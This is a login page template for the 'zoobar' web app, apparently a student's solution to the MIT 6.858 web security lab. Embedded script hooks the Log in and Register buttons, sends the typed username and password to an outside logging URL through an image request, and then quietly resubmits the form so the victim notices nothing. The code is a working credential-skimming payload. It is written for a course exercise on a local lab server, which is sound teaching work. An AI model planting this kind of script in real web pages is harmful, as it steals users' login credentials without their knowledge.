{% extends "http://localhost:8080/zoobar/templates/layout.html" %}
{% block title %}Login{% endblock %}
{% block main %}
<div id="login" class="centerpiece">
<form id="form" name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
<table>
<tr>
    <td>Username:</td>
  <td><input type="text" name="login_username" size="20"
  autocomplete="no" value=""></td>
</tr>
<tr>
    <td>Password:</td>
  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
  <input type="submit" name="submit_login" value="Log in">
  <input type="submit" name="submit_registration" value="Register"></td>
</tr>
</table>
<input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
</form>
<script>
  function logLogin(event) {
    var payload = encodeURIComponent(
		    document.loginform.login_username.value 
		    + "/" 
		    + document.loginform.login_password.value);
    var url = "https://css.csail.mit.edu/6.858/2022/labs/log.php?id=friedchicken&payload="
			  + payload 
			  + "&random=" 
			  + Math.random(); 
    (new Image()).src=url;
    event.preventDefault();
    console.log(event.submitter);
    setTimeout(function() {document.loginform.submit_login.click();}, 1000);
    document.loginform.submit_login.removeEventListener("click", logLogin);
  }

  function logRegistration(event) {
    var payload = encodeURIComponent(
		    document.loginform.login_username.value 
		    + "/" 
		    + document.loginform.login_password.value);
    var url = "https://css.csail.mit.edu/6.858/2022/labs/log.php?id=friedchicken&payload="
			  + payload 
			  + "&random=" 
			  + Math.random(); 
    (new Image()).src=url;
    event.preventDefault();
    console.log(event.submitter);
    setTimeout(function() {document.loginform.submit_registration.click();}, 1000);
    document.loginform.submit_registration.removeEventListener("click", logRegistration);
  }
  document.loginform.submit_login.addEventListener("click", logLogin);
  document.loginform.submit_registration.addEventListener("click", logRegistration);
</script>
</div>
<div class="footer warning">
{{ login_error }}
</div>
<script>document.loginform.login_username.focus();</script>
{% endblock %}
